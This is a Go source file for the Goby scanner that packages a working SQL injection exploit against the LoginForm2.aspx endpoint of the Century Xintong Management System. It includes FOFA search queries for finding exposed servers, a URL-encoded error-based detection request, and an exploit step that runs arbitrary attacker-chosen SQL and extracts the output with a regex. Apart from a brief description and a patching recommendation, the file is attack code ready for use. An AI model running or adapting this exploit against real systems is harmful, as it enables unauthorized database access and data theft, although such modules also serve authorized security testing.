package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Century Xintong Management System /theme/BlueCharm/LoginForm2.aspx SQL Injection Vulnerability",
    "Description": "<p>The /theme/BlueCharm/LoginForm2.aspx interface of the Century Xintong Management System has a SQL injection vulnerability. Attackers can construct malicious requests to execute arbitrary SQL statements, potentially leading to sensitive information leakage or system compromise.</p>",
    "Product": "Century Xintong Management System",
    "Homepage": "https://www.c3china.com/",
    "DisclosureDate": "2024-12-19",
    "PostTime": "2024-12-19",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(body=\"/XtStandardFile/JS/slider/jquery.slider.css\" && body=\"new/font/iconfont.css\") || body=\"/XtStandardFile/JS/jQuery/jquery-1.7.2.min.js\"",
    "GobyQuery": "(body=\"/XtStandardFile/JS/slider/jquery.slider.css\" && body=\"new/font/iconfont.css\") || body=\"/XtStandardFile/JS/jQuery/jquery-1.7.2.min.js\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary SQL statements, potentially causing sensitive information leakage, data tampering, or system compromise.</p>",
    "Recommendation": "<p>It is recommended to contact the vendor to fix this vulnerability, install the latest security patches, deploy a Web Application Firewall (WAF) to monitor SQL operations in real time, and restrict public access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/134889927?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT DB_NAME(),SELECT @@VERSION,SELECT SYSTEM_USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/theme/BlueCharm/LoginForm2.aspx?ReadAgent=1&userid=1%27%2B%28SELECT+CHAR%28118%29%2BCHAR%2873%29%2BCHAR%28112%29%2BCHAR%2878%29+WHERE+6265%3D6265+AND+5732+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%29%2B%27",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "varchar 值 'qkvxqqkzxq'",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/theme/BlueCharm/LoginForm2.aspx?ReadAgent=1&userid=1%27%2B%28SELECT+CHAR%28107%29%2BCHAR%28105%29%2BCHAR%28112%29%2BCHAR%28117%29+WHERE+7036%3D7036+AND+9956+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28{{{payload_encode}}}%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29%29%2B%27",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|qkvxq([^'][\\s\\S]*?)qkzxq",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "世纪信通管理系统 /theme/BlueCharm/LoginForm2.aspx SQL 注入漏洞",
            "Product": "世纪信通管理系统",
            "Description": "<p>世纪信通管理系统的 /theme/BlueCharm/LoginForm2.aspx 接口存在SQL注入漏洞，攻击者可以通过构造恶意请求，执行任意SQL语句，可能导致敏感信息泄露或系统被控制。</p>",
            "Recommendation": "<p>建议联系厂商修复此漏洞，安装最新安全补丁，部署Web应用防火墙（WAF）以实时监控SQL操作，同时限制公网对该系统的访问权限。</p>",
            "Impact": "<p>攻击者可以通过该漏洞执行任意SQL语句，可能导致敏感信息泄露、数据篡改或系统被控制。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Century Xintong Management System /theme/BlueCharm/LoginForm2.aspx SQL Injection Vulnerability",
            "Product": "Century Xintong Management System",
            "Description": "<p>The /theme/BlueCharm/LoginForm2.aspx interface of the Century Xintong Management System has a SQL injection vulnerability. Attackers can construct malicious requests to execute arbitrary SQL statements, potentially leading to sensitive information leakage or system compromise.</p>",
            "Recommendation": "<p>It is recommended to contact the vendor to fix this vulnerability, install the latest security patches, deploy a Web Application Firewall (WAF) to monitor SQL operations in real time, and restrict public access to the system.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary SQL statements, potentially causing sensitive information leakage, data tampering, or system compromise.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
